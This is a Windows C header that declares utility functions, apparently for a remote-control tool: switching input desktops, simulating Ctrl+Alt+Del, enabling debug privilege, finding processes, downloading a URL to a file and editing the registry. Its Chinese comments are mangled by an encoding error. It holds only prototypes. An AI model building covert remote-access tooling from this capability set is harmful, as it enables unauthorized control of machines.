#pragma once
#if !defined(AFX_UNTIL_H_INCLUDED)
#define AFX_UNTIL_H_INCLUDED

typedef struct 
{
	unsigned ( __stdcall *start_address )( void * );
	void	*arglist;
	bool	bInteractive; // �Ƿ�֧�ֽ�������
	HANDLE	hEventTransferArg;
}THREAD_ARGLIST, *LPTHREAD_ARGLIST;
unsigned int __stdcall ThreadLoader(LPVOID param);
HANDLE MyCreateThread (LPSECURITY_ATTRIBUTES lpThreadAttributes, // SD
					   SIZE_T dwStackSize,                       // initial stack size
					   LPTHREAD_START_ROUTINE lpStartAddress,    // thread function
					   LPVOID lpParameter,                       // thread argument
					   DWORD dwCreationFlags,                    // creation option
					   LPDWORD lpThreadId,
					   bool bInteractive = false);

//bool SwitchInputDesktop();
DWORD GetProcessID(LPCTSTR lpProcessName);
BOOL SelectDesktop(TCHAR *name);
BOOL SelectHDESK(HDESK new_desktop);
BOOL SimulateCtrlAltDel();
BOOL EnumProcesin(LPTSTR lpProcessName);
BOOL CheckFileExist(LPCTSTR lpszPath);
char * my_strncpy( char * dest, const char * source, int count );
bool http_get(LPCTSTR szURL, LPCTSTR szFileName);
BOOL DebugPrivilege(const char *PName,BOOL bEnable);
int WriteToLog(char* str);
//��ȡע����ָ����������(Mode:0-����ֵ���� 1-�����Ӽ� 2-����ָ������ 3-�жϸü��Ƿ����)
int ReadRegEx(HKEY MainKey,LPCTSTR SubKey,LPCTSTR Vname,DWORD Type,char *szData,LPBYTE szBytes,DWORD lbSize,int Mode);
//дע����ָ����������(Mode:0-�½������� 1-���ü����� 2-ɾ��ָ���� 3-ɾ��ָ������)
int WriteRegEx(HKEY MainKey,LPCTSTR SubKey,LPCTSTR Vname,DWORD Type,char* szData,DWORD dwData,int Mode);
#endif // !defined(AFX_UNTIL_H_INCLUDED)